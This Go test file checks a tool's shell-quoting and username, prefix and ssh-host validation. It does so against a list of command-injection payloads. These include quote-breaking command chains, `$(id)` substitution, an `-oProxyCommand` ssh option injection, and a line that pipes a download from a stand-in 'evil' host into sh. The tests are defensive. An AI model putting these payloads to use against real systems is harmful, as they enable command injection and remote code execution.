package connection

import (
	"os/exec"
	"strings"
	"testing"
)

// The payloads below are the shapes an attacker would actually use: a key
// comment, a username or a home directory that closes the quoting locksmith
// wraps them in and appends a command of its own.
var injectionPayloads = []struct {
	name    string
	payload string
}{
	{"closes the quote and chains a command", `x'; touch /tmp/pwned; echo '`},
	{"closes the quote and pipes to a shell", `x'; curl http://evil/x | sh; echo '`},
	{"a bare apostrophe, as in a name", `alice's laptop`},
	{"command substitution", "x`id`"},
	{"dollar substitution", `x$(id)`},
	{"newline then a command", "x\ntouch /tmp/pwned"},
	{"semicolon", `x; touch /tmp/pwned`},
	{"backslash before a quote", `x\'; touch /tmp/pwned; echo '`},
	{"only quotes", `'''`},
	{"empty", ``},
}

// shellQuote's contract is that the shell sees exactly one word, byte for byte
// what went in. Rather than assert on the escaping, run a real shell and
// compare what it received.
func TestShellQuoteSurvivesARealShell(t *testing.T) {
	sshtestRequireShell(t)

	for _, tc := range injectionPayloads {
		t.Run(tc.name, func(t *testing.T) {
			script := "printf %s " + shellQuote(tc.payload)

			out, err := exec.Command("/bin/sh", "-c", script).Output()
			if err != nil {
				t.Fatalf("running %s: %v", script, err)
			}

			if string(out) != tc.payload {
				t.Errorf("shell saw %q, want %q (from %s)", out, tc.payload, script)
			}
		})
	}
}

// The payloads must not be able to run a second command.
func TestShellQuoteRunsNothingExtra(t *testing.T) {
	sshtestRequireShell(t)

	marker := t.TempDir() + "/should-not-exist"

	for _, tc := range injectionPayloads {
		t.Run(tc.name, func(t *testing.T) {
			// Substitute the harmless probe for the attacker's payload: if the
			// quoting leaks, this file gets created.
			payload := strings.ReplaceAll(tc.payload, "touch /tmp/pwned", "touch "+marker)
			payload = strings.ReplaceAll(payload, "id", "touch "+marker)

			script := "printf %s " + shellQuote(payload) + " >/dev/null"
			if err := exec.Command("/bin/sh", "-c", script).Run(); err != nil {
				t.Fatalf("running %s: %v", script, err)
			}

			if _, err := exec.Command("/bin/sh", "-c", "test -e "+marker).Output(); err == nil {
				t.Errorf("payload %q escaped quoting and ran a command", tc.payload)
			}
		})
	}
}

func TestCheckRemoteName(t *testing.T) {
	tests := []struct {
		name string
		ok   bool
	}{
		{"root", true},
		{"ubuntu", true},
		{"ec2-user", true},
		{"alice.smith", true},
		{"svc_account", true},
		{"", true}, // means "the account we logged in as"
		// A name lands after a "~", where it cannot be quoted without
		// defeating tilde expansion, so anything shell-significant is refused.
		{"root; touch /tmp/pwned", false},
		{"root/../../etc", false},
		{"$(id)", false},
		{"`id`", false},
		{"root name", false},
		{"root'", false},
		{"-oProxyCommand=x", false},
		{"-root", false},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := checkRemoteName("username", tc.name)
			if tc.ok && err != nil {
				t.Errorf("checkRemoteName(%q) = %v, want accepted", tc.name, err)
			}
			if !tc.ok && err == nil {
				t.Errorf("checkRemoteName(%q) was accepted, want refused", tc.name)
			}
		})
	}
}

func TestCheckPrefix(t *testing.T) {
	for _, ok := range []string{"", "sudo"} {
		if err := checkPrefix(ok); err != nil {
			t.Errorf("checkPrefix(%q) = %v, want accepted", ok, err)
		}
	}
	for _, bad := range []string{"sudo -u root", "doas", "; touch /tmp/pwned"} {
		if err := checkPrefix(bad); err == nil {
			t.Errorf("checkPrefix(%q) was accepted, want refused", bad)
		}
	}
}

// A connection string beginning with "-" would be consumed by ssh as an
// option; -oProxyCommand=... is arbitrary code execution on the machine running
// locksmith. Connection strings come back out of a repository the README
// invites teams to share over git, so they are not trusted input.
func TestNewSshCmdRefusesOptionLikeHost(t *testing.T) {
	sshtestRequireShell(t)

	for _, host := range []string{"-oProxyCommand=touch /tmp/pwned", "-D", "--version"} {
		t.Run(host, func(t *testing.T) {
			cmd, err := NewSshCmd(host)
			if err == nil {
				if cmd != nil {
					cmd.Close()
				}
				t.Errorf("NewSshCmd(%q) was accepted, want refused", host)
			}
		})
	}
}
